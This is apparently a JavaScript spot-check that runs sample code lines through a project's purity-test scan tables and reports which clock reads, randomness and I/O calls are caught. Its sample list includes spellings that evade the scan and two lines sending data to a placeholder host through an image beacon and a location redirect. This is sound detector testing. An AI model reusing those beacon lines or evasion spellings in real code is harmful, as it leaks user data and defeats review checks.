// Spot check of the two scan tables in tests/purity.test.js against clock-read and I/O spellings, one per
// line, run through the same two views the test uses (whole text, and code with comments removed).
// "caught" means at least one table entry matched. Spellings the spec's R16 note already names as left
// to review (alias forms) are marked "named in R16". Nothing is imported from the test and nothing is written.
import fs from "node:fs";
import vm from "node:vm";

const root = new URL("../../../../../../", import.meta.url);
const testText = fs.readFileSync(new URL("tests/purity.test.js", root), "utf8");
const pick = (pattern) => testText.match(pattern)[0];
const { withoutComments, CLOCK_AND_RANDOM_READS, BANNED_IN_CODE } = vm.runInNewContext(
  [
    pick(/^const withoutComments = .*;$/m),
    pick(/^const CLOCK_AND_RANDOM_READS = \{[\s\S]*?^\};$/m),
    pick(/^const BANNED_IN_CODE = \{[\s\S]*?^\};$/m),
    "({ withoutComments, CLOCK_AND_RANDOM_READS, BANNED_IN_CODE })",
  ].join("\n"),
);

const caught = (line) => {
  const found = [];
  for (const [view, text] of [["text", line], ["code", withoutComments(line)]]) {
    for (const [rule, pattern] of Object.entries(CLOCK_AND_RANDOM_READS)) if (pattern.test(text)) found.push(`${view}:${rule}`);
  }
  for (const [rule, pattern] of Object.entries(BANNED_IN_CODE)) if (pattern.test(withoutComments(line))) found.push(`code:${rule}`);
  return found;
};

const lines = [
  // must be caught
  ["new Date()", "const t = new Date();"],
  ["new Date without parentheses", "const t = new Date;"],
  ["new Date, spaced", "const t = new  Date ( );"],
  ["new Date split over lines", "const t = new Date(\n);"],
  ["Date.now()", "const t = Date.now();"],
  ["Date.now spaced", "const t = Date . now();"],
  ["Date.now not called", "const f = Date.now;"],
  ["Date()", "const s = Date();"],
  ["String(Date())", "const s = String(Date());"],
  ["comment splits the call", "const t = new Date(/* today */);"],
  ["Temporal.Now", "const t = Temporal.Now.instant();"],
  ["performance.now", "const t = performance.now();"],
  ["Math.random", "const r = Math.random();"],
  ["crypto", "const r = crypto.randomUUID();"],
  ["fetch", "fetch(url);"],
  ["XMLHttpRequest", "const x = new XMLHttpRequest();"],
  ["sendBeacon", "navigator.sendBeacon(u, d);"],
  ["localStorage", "localStorage.setItem(k, v);"],
  ["setTimeout", "setTimeout(f, 0);"],
  ["dynamic import", "const m = await import(u);"],
  ["eval", "eval(code);"],
  ["new Function", "const f = new Function(code);"],
  // must stay allowed
  ["ALLOWED new Date(y, m, d)", "const d = new Date(y, m, d);"],
  ["ALLOWED new Date(key)", "const d = new Date(key);"],
  ["ALLOWED Date.UTC", "const ms = Date.UTC(2026, 0, 1);"],
  ["ALLOWED Temporal.PlainDate", "const d = Temporal.PlainDate.from(key).add({ days: 1 });"],
  ["ALLOWED comment says the week window", "// the week window"],
  // spellings a text scan does not see
  ["named in R16: Reflect.construct", "const t = Reflect.construct(Date, []);"],
  ["named in R16: alias", "const Clock = Date; const t = new Clock();"],
  ["named in R16: new (Date)()", "const t = new (Date)();"],
  ["NOT named in R16: Date[\"now\"]()", 'const t = Date["now"]();'],
  ["NOT named in R16: Date?.now()", "const t = Date?.now();"],
  ["NOT named in R16: Date.call()", "const s = Date.call();"],
  ["NOT named in R16: destructured now", "const { now } = Date; const t = now();"],
  ["NOT named in R16: new Date(...[])", "const t = new Date(...[]);"],
  ["NOT named in R16: Image beacon", 'new Image().src = "https://x.invalid/?d=" + d;'],
  ["NOT named in R16: location assign", 'location.href = "https://x.invalid/?d=" + d;'],
];

for (const [label, line] of lines) {
  const found = caught(line);
  console.log(`${found.length > 0 ? "caught " : "passes "} ${label.padEnd(44)} ${found.join(", ")}`);
}
